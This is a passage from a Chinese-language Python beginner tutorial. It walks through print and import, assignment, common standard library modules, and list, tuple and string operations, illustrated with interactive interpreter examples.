= &quot;Hello，&quot;&gt;&gt;&gt; y = &quot;Python&quot;&gt;&gt;&gt; x + y&apos;Hello，Python&apos;</code></pre><h3 id="7-print与import"><a href="#7-print与import" class="headerlink" title="7. print与import"></a>7. print与import</h3><p><strong><em>(1) 打印多个函数</em></strong></p><pre><code>&gt;&gt;&gt; print(&apos;Hello&apos;,&apos;python&apos;,&apos;org&apos;)Hello python org&gt;&gt;&gt; print(&apos;Hello&apos;,&apos;python&apos;,&apos;org&apos;,sep=&apos;_&apos;)  #自定义分隔符Hello_python_org&gt;&gt;&gt; print(&apos;hello&apos;,&apos;,&apos;,&apos;python&apos;)hello , python&gt;&gt;&gt; print(&apos;hello&apos;+&apos;,&apos;,&apos;python&apos;) #避免逗号前空格出现hello, python</code></pre><p><strong><em>(2) 导入时重命名</em></strong></p><p><em>在语句末尾添加 as 子句并指定别名</em></p><pre><code>&gt;&gt;&gt; import math as foobar&gt;&gt;&gt; foobar.sqrt(3)1.7320508075688772&gt;&gt;&gt; from math import sqrt as foobar&gt;&gt;&gt; foobar(4)2.0</code></pre><h3 id="8-赋值语句"><a href="#8-赋值语句" class="headerlink" title="8. 赋值语句"></a>8. 赋值语句</h3><p><strong><em>(1) 序列解包</em></strong></p><p><em>序列解包（或可迭代对象解包）：将一个序列（或任何可迭代对象）解包，并将得到的值存储到一系列变量中</em></p><pre><code>&gt;&gt;&gt; values = 1,2,3&gt;&gt;&gt; values(1, 2, 3)&gt;&gt;&gt; x,y,z = values&gt;&gt;&gt; x1&gt;&gt;&gt; a,b,*rest = [1,3,5,7]  #使用星号运算符（ * ）来收集多余的值&gt;&gt;&gt; rest[5, 7]</code></pre><p><strong><em>(2) 链式赋值</em></strong></p><p><em>一种快捷方式，用于将多个变量关联到同一个值</em></p><pre><code>x = y = somefunction()</code></pre><p><strong><em>(3) 增强赋值</em></strong></p><p><em>将右边表达式中的运算符（这里是 + ）移到赋值运算符（ = ）的前面</em></p><pre><code>&gt;&gt;&gt; x = 2&gt;&gt;&gt; x += 1  # x = x+1&gt;&gt;&gt; x3&gt;&gt;&gt; x *= 2  # x = x*2&gt;&gt;&gt; x6</code></pre><h3 id="9-代码缩进"><a href="#9-代码缩进" class="headerlink" title="9. 代码缩进"></a>9. 代码缩进</h3><p><em>代码块是一组语句，可在满足条件时执行（ if 语句），可执行多次（循环），等等；代码块是通过缩进代码（即在前面加空格）来创建的</em></p><p><em>在Python中，使用冒号<code>（ : ）</code>指出接下来是一个代码块，并将该代码块中的每行代码都缩进相同的程度</em></p><h3 id="10-常用标准库"><a href="#10-常用标准库" class="headerlink" title="10. 常用标准库"></a>10. 常用标准库</h3><p><strong><em>(1) 操作系统接口</em></strong></p><p><em>os模块提供了不少与操作系统相关联的函数</em></p><pre><code>&gt;&gt;&gt; import os&gt;&gt;&gt; os.getcwd()   # 返回当前工作目录&apos;C:\\Users\\Python\\Python36-32&apos;&gt;&gt;&gt; os.system(&apos;mkdir test&apos;) # 在当前目录下创建文件夹0&gt;&gt;&gt; os.chdir(&apos;H:\Code\Python&apos;) # 修改当前的工作目录       &gt;&gt;&gt; os.getcwd()           &apos;H:\\Code\\Python&apos;  &gt;&gt;&gt; dir(os)&lt;returns a list of all module functions&gt;&gt;&gt;&gt; help(os)&lt;returns an extensive manual page created from the module&apos;s docstrings&gt;</code></pre><p><strong><em>(2) 文件通配符</em></strong></p><p><em>glob模块提供了一个函数用于从目录通配符搜索中生成文件列表</em></p><pre><code>&gt;&gt;&gt; import glob           &gt;&gt;&gt; glob.glob(&apos;*.py&apos;)       [&apos;class.py&apos;, &apos;except.py&apos;, &apos;for.py&apos;, &apos;if.py&apos;, &apos;ponebook.py&apos;, &apos;while.py&apos;]</code></pre><p><strong><em>(3) sys 模块</em></strong></p><p><em>通用工具脚本经常调用命令行参数；这些命令行参数以链表形式存储于 sys 模块的 argv 变量</em></p><pre><code>&gt;&gt;&gt; import sys&gt;&gt;&gt; print(sys.argv)</code></pre><p><em>错误输出重定向和程序终止：sys 还有 stdin，stdout 和 stderr 属性，即使在 stdout 被重定向时，后者也可以用于显示警告和错误信息</em></p><pre><code>&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.stderr.write(&apos;Warning: log file not found starting a new one\n&apos;)Warning: log file not found starting a new one</code></pre><p><strong><em>(4) 正则匹配</em></strong></p><p><em>re模块为高级字符串处理提供了正则表达式工具</em></p><pre><code>&gt;&gt;&gt; import re&gt;&gt;&gt; re.findall(r&apos;\bf[a-z]*&apos;, &apos;which foot or hand fell fastest&apos;)[&apos;foot&apos;, &apos;fell&apos;, &apos;fastest&apos;]&gt;&gt;&gt; re.sub(r&apos;(\b[a-z]+) \1&apos;, r&apos;\1&apos;, &apos;cat in the the hat&apos;)&apos;cat in the hat&apos;</code></pre><p><strong><em>(5) 数学运算</em></strong></p><p><em>math模块为浮点运算提供了对底层C函数库的访问</em></p><pre><code>&gt;&gt;&gt; import math&gt;&gt;&gt; math.log2(1024)10.0</code></pre><p><em>random提供了生成随机数的工具</em></p><blockquote><blockquote><blockquote><p>import random<br>random.sample(range(1000),8)  # 选定范围内生成指定数目随机数<br>[955, 279, 56, 855, 217, 631, 326, 162]<br>random.random()  # 生成一个浮点类型的随机数<br>0.2882298308566874</p></blockquote></blockquote></blockquote><p><strong><em>(6) 日期时间</em></strong></p><p><em><code>datetime</code>模块为日期和时间处理同时提供了简单和复杂的方法</em></p><pre><code>&gt;&gt;&gt; from datetime import date&gt;&gt;&gt; now = date.today()&gt;&gt;&gt; nowdatetime.date(2018, 10, 21)</code></pre><p><strong><em>(7) 数据压缩</em></strong></p><p><em>以下模块直接支持通用的数据打包和压缩格式：zlib，gzip，bz2，zipfile，以及 tarfile</em></p><pre><code>&gt;&gt;&gt; import zlib&gt;&gt;&gt; s = b&apos;witch which has which witches wrist watch&apos;&gt;&gt;&gt; len(s)41&gt;&gt;&gt; t = zlib.compress(s)&gt;&gt;&gt; len(t)37&gt;&gt;&gt; zlib.decompress(t)b&apos;witch which has which witches wrist watch&apos;&gt;&gt;&gt; zlib.crc32(s)226805979</code></pre><p><em>参考链接：</em></p><ul><li><p><em><a href="http://www.runoob.com/python3/python3-stdlib.html" target="_blank" rel="noopener">http://www.runoob.com/python3/python3-stdlib.html</a></em></p></li><li><p><em><a href="http://www.runoob.com/python3/python3-os-file-methods.html" target="_blank" rel="noopener">http://www.runoob.com/python3/python3-os-file-methods.html</a></em></p></li></ul><h3 id="11-文件方法"><a href="#11-文件方法" class="headerlink" title="11. 文件方法"></a>11. 文件方法</h3><p><strong><em>(1) open() 方法</em></strong></p><p><em>open() 方法用于打开一个文件，并返回文件对象，在对文件进行处理过程都需要使用到这个函数，如果该文件无法被打开，会抛出 OSError</em></p><pre><code>open(file, mode=&apos;r&apos;, buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None)</code></pre><p><em>参数说明</em></p><pre><code>file: 必需，文件路径（相对或者绝对路径）mode: 可选，文件打开模式buffering: 设置缓冲encoding: 一般使用utf8errors: 报错级别newline: 区分换行符closefd: 传入的file参数类型</code></pre><p><em>参考链接：<a href="http://www.runoob.com/python3/python3-file-methods.html" target="_blank" rel="noopener">http://www.runoob.com/python3/python3-file-methods.html</a></em></p><hr><h2 id="0x02-列表和元组"><a href="#0x02-列表和元组" class="headerlink" title="0x02 列表和元组"></a>0x02 列表和元组</h2><h3 id="1-序列概述"><a href="#1-序列概述" class="headerlink" title="1. 序列概述"></a>1. 序列概述</h3><p><em>Python内置了多种序列，列表，元组，字符串；列表是可以修改的，而元组不可以</em></p><p><em>列表适用于需要中途添加元素的情形，而元组适用于出于某种考虑需要禁止修改序列的情形</em></p><p><em>Python支持一种数据结构的基本概念，名为容器（container）；容器基本上就是可包含其他对象的对象。两种主要的容器是序列（如列表和元组）和映射（如字典）。在序列中，每个元素都有编号，而在映射中，每个元素都有名称（也叫键）</em></p><h3 id="2-通用序列操作"><a href="#2-通用序列操作" class="headerlink" title="2. 通用序列操作"></a>2. 通用序列操作</h3><p><strong><em>(1) 索引</em></strong></p><pre><code>&gt;&gt;&gt; greet = &quot;Hello&quot;&gt;&gt;&gt; greet[1]&apos;e&apos;&gt;&gt;&gt; greet[-1]&apos;o&apos;</code></pre><p><em>索引（indexing）：用来获取单个元素，适用于所有序列；当使用负数索引时，Python将从右（即从最后一个元素）开始往左数，因此-1是最后一个元素的位置</em></p><pre><code>&gt;&gt;&gt; &apos;Python&apos;[1]&apos;y&apos;</code></pre><p><em>对于字符串字面量（以及其他的序列字面量），可直接对其执行索引操作，无需先将其赋给变量</em></p><p><strong><em>(2) 切片</em></strong></p><p><em>使用切片（slicing）来访问特定范围内的元素，可使用两个索引，并用冒号分隔</em></p><pre><code>&gt;&gt;&gt; tag = &apos;&lt;a href=&quot;http://www.python.org&quot;&gt;Python web site&lt;/a&gt;&apos;&gt;&gt;&gt; tag[9:30]&apos;http://www.python.org&apos;&gt;&gt;&gt; tag[32:-4]&apos;Python web site&apos;</code></pre><p><em>第一个索引是包含的第一个元素的编号，但第二个索引是切片后余下的第一个元素的编号</em></p><pre><code>&gt;&gt;&gt; number = [1,2,3,4,5,6,7,8,9]&gt;&gt;&gt; number[3:6][4, 5, 6]&gt;&gt;&gt; number[-3:-1][7, 8]&gt;&gt;&gt; number[-3:][7, 8, 9]&gt;&gt;&gt; number[:3][1, 2, 3]&gt;&gt;&gt; number[:][1, 2, 3, 4, 5, 6, 7, 8, 9]</code></pre><p><strong><em>指定步长切片</em></strong></p><pre><code>&gt;&gt;&gt; number[0:9:1][1, 2, 3, 4, 5, 6, 7, 8, 9]&gt;&gt;&gt; number[0:9:2][1, 3, 5, 7, 9]&gt;&gt;&gt; number[0:9:3][1, 4, 7]&gt;&gt;&gt; number[9:0:-3][9, 6, 3]</code></pre><p><em>步长为正数时，它从起点移到终点，而步长为负数时，它从终点移到起点</em></p><p><strong><em>(3) 序列拼接</em></strong></p><pre><code>&gt;&gt;&gt; [1,4,7] + [2,5,8][1, 4, 7, 2, 5, 8]&gt;&gt;&gt; [1,2,3] + &quot;hello&quot;TypeError: can only concatenate list (not &quot;str&quot;) to list</code></pre><p><em>可使用加法运算符来拼接序列，不能拼接不同类型的序列</em></p><p><strong><em>(4) 乘法</em></strong></p><pre><code>&gt;&gt;&gt; &apos;girl&apos; * 5&apos;girlgirlgirlgirlgirl&apos;&gt;&gt;&gt; [5] * 8[5, 5, 5, 5, 5, 5, 5, 5]</code></pre><p><em>将序列与数x相乘时，将重复这个序列x次来创建一个新序列</em></p><p><strong><em>(5) 成员资格</em></strong></p><p><em>要检查特定的值是否包含在序列中，可使用运算符 in，它检查是否满足指定的条件，并返回相应的值：满足时返回 True ，不满足时返回 False</em> </p><pre><code>&gt;&gt;&gt; permissions = &apos;xwr&apos;&gt;&gt;&gt; &apos;x&apos; in permissionsTrue&gt;&gt;&gt; users = [&apos;Alice&apos;,&apos;Tom&apos;,&apos;Frank&apos;]&gt;&gt;&gt; input(&quot;Enter your name:&quot;) in  usersEnter your name:TomTrue</code></pre><p><strong><em>(6) 长度和最值</em></strong></p><p><em>内置函数 len 、 min 和 max 很有用，其中函数 len 返回序列包含的元素个数，而 min 和max 分别返回序列中最小和最大的元素</em></p><pre><code>&gt;&gt; numbers = [121,0x12,336]&gt;&gt;&gt; len(numbers)3&gt;&gt;&gt; max(numbers)336&gt;&gt;&gt; min(numbers)18&gt;&gt;&gt; max(56,0x28)56&gt;&gt;&gt; min(0x12,0b1100)12</code></pre><h3 id="3-列表及用法"><a href="#3-列表及用法" class="headerlink" title="3. 列表及用法"></a>3. 列表及用法</h3><p><em>列表是Python重要的数据结构，将一系列值组合成数据结构并通过编号来访问各个值；列表很有用列表是可变的，即可修改其内容，列表有很多特有的方法</em></p><p><strong><em>(1) 函数 list</em></strong></p><p><em>任何序列均可（不仅仅是字符串）作为 list 的参数，创建列表</em></p><pre><code>&gt;&gt;&gt; list(&quot;Python3.6&quot;)[&apos;P&apos;, &apos;y&apos;, &apos;t&apos;, &apos;h&apos;, &apos;o&apos;, &apos;n&apos;, &apos;3&apos;, &apos;.&apos;, &apos;6&apos;]&gt;&gt;&gt; a = list(&quot;Python&quot;)&gt;&gt;&gt; a[&apos;P&apos;, &apos;y&apos;, &apos;t&apos;, &apos;h&apos;, &apos;o&apos;, &apos;n&apos;]&gt;&gt;&gt; &apos;&apos;.join(a)    将字符列表转换为字符串&apos;Python&apos;</code></pre><p><strong><em>(2) 列表操作</em></strong></p><p><em>可对列表执行所有的标准序列操作，如索引、切片、拼接和相乘，列表也是可以修改的，如：给元素赋值、删除元素、给切片赋值以及使用列表的方法</em></p><p><em>A. 修改列表：给元素赋值</em></p><p><em>使用索引表示法给特定位置的元素赋值，如 x[1] = 2</em></p><pre><code>&gt;&gt;&gt; x = [1,4,7,2,5,8]&gt;&gt;&gt; x[1, 4, 7, 2, 5, 8]&gt;&gt;&gt; x[1] = 9&gt;&gt;&gt; x[1, 9, 7, 2, 5, 8]</code></pre><p><em>B. 删除元素</em></p><p><em>使用 del 语句从列表中删除元素； del 语句还可用于用于字典乃至变量</em></p><pre><code>&gt;&gt;&gt; lessons[&apos;English&apos;, &apos;math&apos;, &apos;Chinese&apos;, &apos;Computer&apos;]&gt;&gt;&gt; del lessons[2:]&gt;&gt;&gt; lessons[&apos;English&apos;, &apos;math&apos;]&gt;&gt;&gt; len(lessons)2</code></pre><p><em>C. 给切片赋值</em></p><pre><code>&gt;&gt;&gt; code = list(&apos;python&apos;)&gt;&gt;&gt; code[&apos;p&apos;, &apos;y&apos;, &apos;t&apos;, &apos;h&apos;, &apos;o&apos;, &apos;n&apos;]&gt;&gt;&gt; code[1:] = list(&apos;erl&apos;)&gt;&gt;&gt; code[&apos;p&apos;, &apos;e&apos;, &apos;r&apos;, &apos;l&apos;]</code></pre><p><em>使用切片赋值还可在不替换原有元素的情况下插入新元素</em></p><pre><code>&gt;&gt;&gt; num = [1,3,5,11]&gt;&gt;&gt; num[3:3] = [7,9]&gt;&gt;&gt; num[1, 3, 5, 7, 9, 11]</code></pre><p><em>空切片替换，进行删除操作</em></p><pre><code>&gt;&gt;&gt; num[1:3] = []&gt;&gt;&gt; num[1, 7, 9, 11]</code></pre><p><strong><em>(3) 列表方法</em></strong></p><p><em>方法是与对象（列表、数、字符串等）联系紧密的函数，调用方法：<code>object.method(arguments)</code></em></p><p><em>A. append：方法 append 用于将一个对象附加到列表末尾</em></p><pre><code>&gt;&gt;&gt; lessons[&apos;English&apos;, &apos;math&apos;]&gt;&gt;&gt; lessons.append(&apos;Chinese&apos;)&gt;&gt;&gt; lessons[&apos;English&apos;, &apos;math&apos;, &apos;Chinese&apos;]</code></pre><p><em>B. clear：方法 clear 就地清空列表内容，类似于切片赋值语句 <code>lst[:] = []</code> </em></p><pre><code>&gt;&gt;&gt; num[1, 7, 9, 11]&gt;&gt;&gt; num.clear()&gt;&gt;&gt; num[]&gt;&gt;&gt; num = [1,7,9,11]&gt;&gt;&gt; num[1, 7, 9, 11]&gt;&gt;&gt; num[:] = []&gt;&gt;&gt; num[]</code></pre><p><em>C. copy：方法 copy 复制列表</em></p><pre><code>常规复制只是将另一个名称关联到列表&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; b = a&gt;&gt;&gt; b[2] = 4&gt;&gt;&gt; a[1, 2, 4]要让 a 和 b 指向不同的列表，必须将 b 关联到 a 的副本&gt;&gt;&gt; a = [1,2,3]&gt;&gt;&gt; b = a.copy()&gt;&gt;&gt; b[2] = 4&gt;&gt;&gt; a[1, 2, 3]</code></pre><p><em>D. count：方法 count 计算指定的元素在列表中出现了多少次</em></p><pre><code>&gt;&gt;&gt; [&apos;to&apos;, &apos;be&apos;, &apos;or&apos;, &apos;not&apos;, &apos;to&apos;, &apos;be&apos;].count(&apos;to&apos;)2&gt;&gt;&gt; x = [[1, 2], 1, 1, [2, 1, [1, 2]]]&gt;&gt;&gt; x.count(1)2&gt;&gt;&gt; x.count([1, 2])1</code></pre><p><em>E. extend：方法 extend 能同时将多个值附加到列表末尾，可使用一个列表来扩展另一个列表</em></p><pre><code>修改被扩展的序列a&gt;&gt;&gt; a = [1,4,7]&gt;&gt;&gt; b = [2,5,8]&gt;&gt;&gt; a.extend(b)&gt;&gt;&gt; a[1, 4, 7, 2, 5, 8]拼接后序列a未被修改&gt;&gt;&gt; a = [1,4,7]&gt;&gt;&gt; b = [2,5,8]&gt;&gt;&gt; a + b[1, 4, 7, 2, 5, 8]&gt;&gt;&gt; a[1, 4, 7]要获得与 extend 相同的效果，可将列表赋给切片&gt;&gt;&gt; a[len(a):] = b&gt;&gt;&gt; a[1, 4, 7, 2, 5, 8]</code></pre><p><em>F. index：方法 index 在列表中查找指定值第一次出现的索引</em></p><pre><code>&gt;&gt;&gt; x = [&apos;to&apos;,&apos;be&apos;,&apos;or&apos;,&apos;not&apos;,&apos;to&apos;,&apos;be&apos;]&gt;&gt;&gt; x.index(&apos;be&apos;)1&gt;&gt;&gt; x[1]&apos;be&apos;</code></pre><p><em>G. insert：方法 insert 用于将一个对象插入列表</em></p><pre><code>&gt;&gt;&gt; numbers = [1, 2, 3, 5, 6, 7]&gt;&gt;&gt; numbers.insert(3, &apos;four&apos;)&gt;&gt;&gt; numbers[1, 2, 3, &apos;four&apos;, 5, 6, 7]使用切片赋值来获得与 insert 一样的效果&gt;&gt;&gt; numbers = [1, 2, 3, 5, 6, 7]&gt;&gt;&gt; numbers[3:3] = [&apos;four&apos;]&gt;&gt;&gt; numbers[1, 2, 3, &apos;four&apos;, 5, 6, 7]</code></pre><p><em>H. pop：方法 pop 从列表中删除一个元素（末尾为最后一个元素），并返回这一元素</em></p><pre><code>&gt;&gt;&gt; x = [1,2,3]&gt;&gt;&gt; x.pop()3&gt;&gt;&gt; x[1, 2]&gt;&gt;&gt; x.pop(1)2&gt;&gt;&gt; x[1]</code></pre><p><em>pop 是唯一既修改列表又返回一个非 None 值的列表方</em></p><pre><code>&gt;&gt;&gt; x = [1, 2, 3]&gt;&gt;&gt; x.append(x.pop())&gt;&gt;&gt; x[1, 2, 3]</code></pre><p><em>push 和 pop 是两种栈操作（加入和取走）的名称；Python没有提供 push ，但可使用 append 来替代；方法 pop 和 append 的效果相反，因此将刚弹出的值压入（或附加）后，得到的栈将与原来相同</em></p><p><em>I. remove：方法 remove 用于删除第一个为指定值的元素</em></p><pre><code>&gt;&gt;&gt; x = [&apos;to&apos;, &apos;be&apos;, &apos;or&apos;, &apos;not&apos;, &apos;to&apos;, &apos;be&apos;]&gt;&gt;&gt; x.remove(&apos;be&apos;)&gt;&gt;&gt; x[&apos;to&apos;, &apos;or&apos;, &apos;not&apos;, &apos;to&apos;, &apos;be&apos;]</code></pre><p> <em>remove 是就地修改且不返回值的方法之一</em></p><p><em>J. reverse：方法 reverse 按相反的顺序排列列表中的元素</em></p><pre><code>&gt;&gt;&gt; x = list(&quot;strings&quot;)&gt;&gt;&gt; x.reverse()&gt;&gt;&gt; x[&apos;s&apos;, &apos;g&apos;, &apos;n&apos;, &apos;i&apos;, &apos;r&apos;, &apos;t&apos;, &apos;s&apos;]</code></pre><p><em>如果要按相反的顺序迭代序列，可使用函数reversed ；这个函数不返回列表，而是返回一个迭代器</em></p><p><em>K. sort：方法 sort 用于对列表就地排序，意味着对原来的列表进行修改，使其元素按顺序排列</em></p><pre><code>&gt;&gt;&gt; x = [1,5,6,9,8,7]&gt;&gt;&gt; x.sort()&gt;&gt;&gt; x[1, 5, 6, 7, 8, 9]sort 修改 x 且不返回任何值，最终的结果是 x 是经过排序的，而 y 包含 None&gt;&gt;&gt; x = [1，5，6，9，8，7]&gt;&gt;&gt; y = x.sort() # Don&apos;t do this!&gt;&gt;&gt; print(y)None正确的方式之一是先将 y 关联到 x 的副本，再对 y 进行排序&gt;&gt;&gt; x = [1,5,6,9,8,7]&gt;&gt;&gt; x[1, 5, 6, 9, 8, 7]&gt;&gt;&gt; y = x.copy()&gt;&gt;&gt; y[1, 5, 6, 9, 8, 7]&gt;&gt;&gt; y.sort()&gt;&gt;&gt; y[1, 5, 6, 7, 8, 9]为获取排序后的列表的副本，另一种方式是使用函数 sorted&gt;&gt;&gt; x = [1,5,6,9,8,7]&gt;&gt;&gt; x[1, 5, 6, 9, 8, 7]&gt;&gt;&gt; y = sorted(x)&gt;&gt;&gt; x[1, 5, 6, 9, 8, 7]&gt;&gt;&gt; y[1, 5, 6, 7, 8, 9]</code></pre><p><em>L. 高级排序</em></p><p><em>方法 sort 接受两个可选参数： key 和 reverse ；这两个参数通常是按名称指定的，称为关键字参数</em></p><pre><code>根据长度对元素进行排序，可将参数 key 设置为函数 len&gt;&gt;&gt; x = [&apos;cloud&apos;,&apos;chinese&apos;,&apos;cool&apos;,&apos;community&apos;]&gt;&gt;&gt; x.sort(key=len)&gt;&gt;&gt; x[&apos;cool&apos;, &apos;cloud&apos;, &apos;chinese&apos;, &apos;community&apos;]对于另一个关键字参数 reverse ，只需将其指定为一个真值，以指出是否要按相反的顺序对列表进行排序&gt;&gt; x = [1,9,2,6,8,7]&gt;&gt;&gt; x[1, 9, 2, 6, 8, 7]&gt;&gt;&gt; x.sort(reverse=True)&gt;&gt;&gt; x[9, 8, 7, 6, 2, 1]</code></pre><h3 id="4-元组及用法"><a href="#4-元组及用法" class="headerlink" title="4. 元组及用法"></a>4. 元组及用法</h3><p><em>与列表一样，元组也是序列，唯一的差别在于<strong>元组是不能修改</strong>的；元组语法很简单，只要将一些值用逗号分隔，就能自动创建一个元组</em></p><pre><code>&gt;&gt;&gt; &apos;h&apos;,&apos;e&apos;,&apos;l&apos;,&apos;l&apos;,&apos;o&apos;(&apos;h&apos;, &apos;e&apos;, &apos;l&apos;, &apos;l&apos;, &apos;o&apos;)&gt;&gt;&gt; 1,4,7(1, 4, 7)&gt;&gt;&gt; x = (1,4,7)&gt;&gt;&gt; x(1, 4, 7)&gt;&gt;&gt; 56,   表示只包含一个值的元组(56,)&gt;&gt;&gt; 5*(8 + 2)50&gt;&gt;&gt; 5*(8 + 2,)(10, 10, 10, 10, 10)&gt;&gt;&gt; tuple(&apos;hello&apos;)   tuple(seq)将一个序列作为参数，并将其转换为元组(&apos;h&apos;, &apos;e&apos;, &apos;l&apos;, &apos;l&apos;, &apos;o&apos;)&gt;&gt;&gt; tuple([1,4,7])(1, 4, 7)&gt;&gt;&gt; x = 1,2,3&gt;&gt;&gt; x[1:](2, 3)</code></pre><ul><li><p><em>它们用作映射中的键（以及集合的成员），而列表不行</em></p></li><li><p><em>有些内置函数和方法返回元组，，只要不尝试修改元组，与元组“打交道”通常意味着像处理列表一样处理它</em></p></li></ul><hr><h2 id="0x03-字符串"><a href="#0x03-字符串" class="headerlink" title="0x03 字符串"></a>0x03 字符串</h2><h3 id="1-基本操作"><a href="#1-基本操作" class="headerlink" title="1. 基本操作"></a>1. 基本操作</h3><p><em>所有标准序列操作（索引、切片、乘法、成员资格检查、长度、最小值和最大值）都适用于字符串，但字符串是不可变的，因此所有的元素赋值和切片赋值都是非法的</em></p><pre><code>&gt;&gt;&gt; website = &quot;http:.//www.python.org&quot;&gt;&gt;&gt; website&apos;http:.//www.python.org&apos;&gt;&gt;&gt; website[-3:] = &apos;com&apos;Traceback (most recent call last):  File &quot;&lt;pyshell#169&gt;&quot;, line 1, in &lt;module&gt;    website[-3:] = &apos;com&apos;TypeError: &apos;str&apos; object does not support item assignment</code></pre><h3 id="2-格式设置"><a href="#2-格式设置" class="headerlink" title="2. 格式设置"></a>2. 格式设置</h3><p><strong>(1) 精简设置</strong></p><pre><code>格式字符串中的 %s 称为转换说明符，指出了要将值插入什么地方；s意味着将值视为字符串进行格式设置&gt;&gt;&gt; format = &quot;Hello,%s %s the python world&quot;&gt;&gt;&gt; values = (&apos;welcome&apos;,&apos;to&apos;)&gt;&gt;&gt; format % values&apos;Hello,welcome to the python world&apos;另一种解决方案是所谓的模板字符串,类似于UNIX shell的语法&gt;&gt;&gt; from string import Template&gt;&gt;&gt; x = Template(&quot;Hello,$who $what python world!&quot;)&gt;&gt;&gt; x.substitute(who=&apos;welcome&apos;,what=&apos;to&apos;)&apos;Hello,welcome to python world!&apos;选择使用字符串方法 format ，每个字替换段都用花括号括起，其中可能包含名称，还可能包含有关如何对相应的值进行转换和格式设置的信息&gt;&gt;&gt; &quot;{3} {0} {2} {1} {3} {0}&quot;.format(&quot;be&quot;, &quot;not&quot;, &quot;or&quot;, &quot;to&quot;)&apos;to be or not to be&apos;&gt;&gt;&gt; &quot;{name} is approximately {value}&quot;.format(value=pi,name=&apos;Π&apos;)&apos;Π is approximately 3.141592653589793&apos;&gt;&gt;&gt; &quot;{name} is approximately {value:.7f}&quot;.format(value=pi,name=&apos;Π&apos;)&apos;Π is approximately 3.1415927&apos;&gt;&gt;&gt; &quot;Euler&apos;s constant is roughly {e}.&quot;.format(e=e)&quot;Euler&apos;s constant is roughly 2.718281828459045.&quot;</code></pre><p><strong>(2) 完整设置</strong></p><p><em>对字符串调用方法 format ，并提供要设置其格式的值；每个值都被插入字符串中，以替换用花括号括起的<strong>替换字段</strong></em></p><pre><code>1.  字段名：索引或标识符，指出要设置哪个值的格式并使用结果来替换该字段；除指定值外，还可指定值的特定部分，如列表的元素2. 转换标志：跟在叹号后面的单个字符。当前支持的字符包括 r 表示 repr）、 s（表示 str）和 a（表示 ascii ）；如果指定了转换标志，将不使用对象本身的格式设置机制，而是使用指定的函数将对象转换为字符串，再做进一步的格式设置3. 格式说明符：跟在冒号后面的表达式（这种表达式是使用微型格式指定语言表示的）；格式说明符让我们能够详细地指定最终的格式，包括格式类型（如字符串、浮点数或十六进制数），字段宽度和数的精度，如何显示符号和千位分隔符，以及各种对齐和填充方式</code></pre><p><em>根据指定的宽度打印格式良好的价格列表</em></p><pre><code>width = int(input(&apos;Please enter width: &apos;))price_width = 10item_width = width - price_widthheader_fmt = &apos;{{:{}}}{{:>{}}}&apos;.format(item_width, price_width)fmt  = &apos;{{:{}}}{{:>{}.2f}}&apos;.format(item_width, price_width)print(&apos;=&apos; * width)print(header_fmt.format(&apos;Item&apos;, &apos;Price&apos;))print(&apos;-&apos; * width)print(fmt.format(&apos;Apples&apos;, 0.4))print(fmt.format(&apos;Pears&apos;, 0.5))print(fmt.format(&apos;Cantaloupes&apos;, 1.92))print(fmt.format(&apos;Dried Apricots (16 oz.)&apos;, 8))print(fmt.format(&apos;Prunes (4 lbs.)&apos;, 12))print(&apos;=&apos; * width)</code></pre><h3 id="3-字符串方法"><a href="#3-字符串方法" class="headerlink" title="3. 字符串方法"></a>3. 字符串方法</h3><p><strong><em>string 模块常用常量</em></strong></p><p><img src="http://pguklm607.bkt.clouddn.com/string.png" alt=""></p><p><strong><em>字符串常用方法</em></strong></p><p><strong><em>(1) center：通过在两边添加填充字符（默认为空格）让字符串居中</em></strong></p><pre><code>&gt;&gt;&gt; &quot;Hello python&quot;.center(20)&apos;    Hello python    &apos;&gt;&gt;&gt; &quot;Hello python&quot;.center(20,&apos;!&apos;)&apos;!!!!Hello python!!!!&apos;</code></pre><p><strong><em>(2) find： 在字符串中查找子串。如果找到，就返回子串的第一个字符的索引，否则返回 -1 </em></strong></p><pre><code>&gt;&gt;&gt; &quot;To be or no to be&quot;.find(&apos;to&apos;)12&gt;&gt;&gt; x = &quot;Welcome to python.org&quot;&gt;&gt;&gt; x.find(&apos;python&apos;)11&gt;&gt;&gt; x.find(&apos;python&apos;,11,18)  指定搜索范围的起点和终点11</code></pre><p><strong><em>(3) join：用于合并序列的元素</em></strong></p><pre><code>所合并序列的元素必须都是字符串&gt;&gt;&gt; seq = [&apos;1&apos;,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;,&apos;5&apos;]&gt;&gt;&gt; sep = &apos;+&apos;&gt;&gt;&gt; sep.join(seq)&apos;1+2+3+4+5&apos;&gt;&gt;&gt; dirs = &apos;&apos;,&apos;usr&apos;,&apos;bin&apos;,&apos;env&apos;&gt;&gt;&gt; &apos;/&apos;.join(dirs)&apos;/usr/bin/env&apos;</code></pre><p><strong><em>(4) lower：返回字符串小写版本</em></strong></p><pre><code>&gt;&gt;&gt; &apos;Welcom To Python.Org&apos;.lower()&apos;welcom to python.org&apos;&gt;&gt;&gt; name = &apos;Frank&apos;&gt;&gt;&gt; names = [&apos;frank&apos;,&apos;tom&apos;,&apos;alice&apos;]&gt;&gt;&gt; if name.lower() in manes: print(&apos;Found it&apos;)found it</code></pre><p><em>title：将字符串转化为词首大写</em></p><pre><code>&gt;&gt;&gt; &apos;welcome to python.org&apos;.title()&apos;Welcome To Python.Org&apos;</code></pre><p><strong><em>(5) replace：指定子串都替换为另一个字符串，并返回替换后的结果</em></strong></p><pre><code>&gt;&gt;&gt; &apos;That is a test&apos;.replace(&apos;at&apos;,&apos;is&apos;)&apos;This is a test&apos;&gt;&gt;&gt; &apos;That is a test&apos;.replace(&apos;That&apos;,&apos;This&apos;)&apos;This is a test&apos;</code></pre><p><strong><em>(6) split：与join相反，将字符串拆分为序列</em></strong></p><pre><code>&gt;&gt;&gt; &apos;/usr/bin/local/src&apos;.split(&apos;/&apos;)[&apos;&apos;, &apos;usr&apos;, &apos;bin&apos;, &apos;local&apos;, &apos;src&apos;]&gt;&gt;&gt; &apos;1+2+3+4+5&apos;.split(&apos;+&apos;)[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;]</code></pre><p><strong><em>(7) strip：将字符串开头和末尾的空白删除，并返回删除后的结果</em></strong></p><pre><code>&gt;&gt;&gt; &apos;  welcome to python.org   &apos;.strip()&apos;welcome to python.org&apos;&gt;&gt;&gt; &apos; !**!Welcome to python.org !!**&apos;.strip(&apos; !*&apos;)&apos;Welcome to 